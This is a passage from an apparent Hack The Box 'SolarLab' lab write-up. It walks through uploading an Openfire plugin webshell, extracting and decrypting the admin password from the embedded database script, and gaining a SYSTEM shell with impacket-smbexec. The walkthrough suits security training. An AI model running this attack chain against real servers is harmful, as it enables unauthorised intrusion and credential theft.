src="/../images/solarlab/openfirelogin.png" alt="alt text"><br>follow the other steps to upload the plugin<br> go to tab plugin &gt; upload plugin <code>openfire-management-tool-plugin.jar</code><br><img src="/../images/solarlab/plugin.png" alt="alt text"></p><p>go to tab server &gt; server settings &gt; Management tool<br>Access webshell with password “123”</p><p>get powershell as openfire with the same technique:<br><img src="/../images/solarlab/powershell-1.png" alt="alt text"></p><h2 id="SQL-Analysis"><a href="#SQL-Analysis" class="headerlink" title="SQL Analysis"></a>SQL Analysis</h2><p>With the newly obtained privilege I can now access <code>\Openfire\</code><br>Found scripts related to DB in <code>/openfire/embedded-db</code>, discovered <code>openfire.script</code>. Searching for <code>CREATE</code> and <code>INSERT</code> queries:<br>I found some queries related to users.<br>the query Underneath shows the schema for Creating the <code>OFUSER</code> table, which is responsible for holding user credentials. </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> MEMORY <span class="keyword">TABLE</span> PUBLIC.OFUSER(USERNAME <span class="type">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT NULL</span>,STOREDKEY <span class="type">VARCHAR</span>(<span class="number">32</span>),SERVERKEY <span class="type">VARCHAR</span>(<span class="number">32</span>),SALT <span class="type">VARCHAR</span>(<span class="number">32</span>),</span><br><span class="line">ITERATIONS <span class="type">INTEGER</span>,</span><br><span class="line"></span><br><span class="line">PLAINPASSWORD <span class="type">VARCHAR</span>(<span class="number">32</span>),ENCRYPTEDPASSWORD <span class="type">VARCHAR</span>(<span class="number">255</span>),</span><br><span class="line"></span><br><span class="line">NAME <span class="type">VARCHAR</span>(<span class="number">100</span>)</span><br><span class="line">,EMAIL <span class="type">VARCHAR</span>(<span class="number">100</span>),CREATIONDATE <span class="type">VARCHAR</span>(<span class="number">15</span>) <span class="keyword">NOT NULL</span>,MODIFICATIONDATE <span class="type">VARCHAR</span>(<span class="number">15</span>) <span class="keyword">NOT NULL</span>,<span class="keyword">CONSTRAINT</span> OFUSER_PK <span class="keyword">PRIMARY KEY</span>(USERNAME))</span><br></pre></td></tr></table></figure><p>Some queries for adding users were also found. The query for creating an admin account was of particular interest to me.<br><img src="/../images/solarlab/OFUSER.png" alt="alt text"><br>format:<br>name,<br><code>key</code>,<br>serverkey,<br> salt,<br><code>plaintext password</code>,<br> <code>encrypted password</code><br> ….The rest. Looks like encryption was used instead of hashing.<br> Unlike hashing, Eencryption does not require a function or algorithm, google up ways to decrypt openfire passwords.<br><img src="/../images/solarlab/google-dcrypt.png" alt="alt text"><br> checked both github repos to discover key name,<br>Column  <code>passwordkey</code> in the  <code>OFPROPERTY</code> table was found. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type .\openfire.script | findstr &quot;OFPROPERTY&quot;</span><br></pre></td></tr></table></figure><p><img src="/../images/solarlab/insert.png" alt="alt text"><br><img src="/image.png" alt="alt text"></p><p>So now i can leverage my findings to get the administrator’s password</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Encrypted-pass:</span><br><span class="line">becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac</span><br><span class="line">62d4e89b2856b0289b365f3069802e59d442</span><br><span class="line">*Key:</span><br><span class="line">hGXiFzsKaAeYLjn  </span><br></pre></td></tr></table></figure><p>I cloned the tool from the  second repo and ran:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -&lt;encrypted-password&gt; &lt;key&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/solarlab/java-cve.png" alt="alt text"></p><p>We found it!:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ThisPasswordShouldDo!@ </span><br></pre></td></tr></table></figure><h2 id="SYSTEM-SHELL"><a href="#SYSTEM-SHELL" class="headerlink" title="SYSTEM SHELL"></a>SYSTEM SHELL</h2><p>let’s now login to administrator with the PW:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbexec administrator:<span class="string">&#x27;&lt;pw&gt;&#x27;</span>@&lt;victim-ip</span><br></pre></td></tr></table></figure><p><img src="/../images/solarlab/SYSTEMXD.png" alt="alt text"><br>root flag was found under<br> <code>Administrator\Desktop\root.txt</code>.</p><p> That’s all, Thank you :)</p>]]></content>
      
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> Writeup </tag>
            
            <tag> nmap </tag>
            
            <tag> HTB </tag>
            
            <tag> smb </tag>
            
            <tag> flask </tag>
            
            <tag> privilege escalation </tag>
            
            <tag> openfire </tag>
            
            <tag> chisel </tag>
            
            <tag> password-spray </tag>
            
            <tag> htb solarlab </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
